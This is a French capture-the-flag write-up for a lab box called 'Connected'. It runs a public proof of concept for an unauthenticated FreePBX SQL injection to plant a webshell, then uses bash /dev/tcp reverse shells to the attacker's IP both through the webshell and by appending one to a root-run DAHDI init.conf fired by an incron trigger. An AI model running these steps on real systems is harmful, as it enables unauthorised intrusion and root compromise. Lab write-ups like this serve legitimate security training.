# Connected

Scans classiques : 

	echo "10.10.14.186 connected.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.14.186 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.14.186 -oN nmap.txt
	
Résultats :

    PORT    STATE SERVICE  REASON         VERSION
    22/tcp  open  ssh      syn-ack ttl 62 OpenSSH 7.4 (protocol 2.0)
    80/tcp  open  http     syn-ack ttl 62 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
    443/tcp open  ssl/http syn-ack ttl 62 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)


Le site fait tourner FreePBX, l'interface web open source pour gérer Asterisk (serveur VoIP). Le footer de la page donne la version (FreePBX 16.0.40.7).

Cette version est vulnérable à une injection SQL non authentifiée qui permet d'accéder à l'interface admin et d'exécuter du code arbitraire :

- https://www.sentinelone.com/vulnerability-database/cve-2025-57819/
- https://github.com/FreePBX/security-reporting/security/advisories/GHSA-m42g-xg4c-5f3h

Un PoC public déploie directement un webshell :

	git clone https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819
    cd watchTowr-vs-FreePBX-CVE-2025-57819 
	python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H http://connected.htb

Conversion en shell : 

```
curl http://connected.htb/this-is-an-ioc-not-actually-watchTowr-fa7fhbtjgq.php?cmd=id

nc -nvlp 9999 

curl -G "http://connected.htb/this-is-an-ioc-not-actually-watchTowr-fa7fhbtjgq.php" \
  --data-urlencode "cmd=bash -i >& /dev/tcp/10.10.14.186/9999 0>&1"

ls
```

## Élévation de privilèges

Comme c'est un serveur Asterisk, on regarde du côté d'incron.d, qui surveille des fichiers sur lesquels notre utilisateur asterisk a un droit d'écriture :

	cat /etc/incron.d/*

Une entrée intéressante :

	/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart

Si ce fichier est modifié, cela déclenche un restart du service DAHDI. On cherche ensuite un fichier lié à DAHDI sur lequel asterisk peut aussi écrire :

	find / -type f -name "*.conf" -writable 2>/dev/null
	

Le fichier init.conf matche et est exécuté lors du restart du service. On va le corrompre :

	echo "bash -c 'bash -i >& /dev/tcp/10.10.14.186/9998 0>&1'" >> /etc/dahdi/init.conf
    
    echo "Restart" >> /var/spool/asterisk/sysadmin/dahdi_restart


Côté attaquant :

	nc -lvnp 9998 
    id
    cat /root/root.txt
    cat /home/*/user.txt

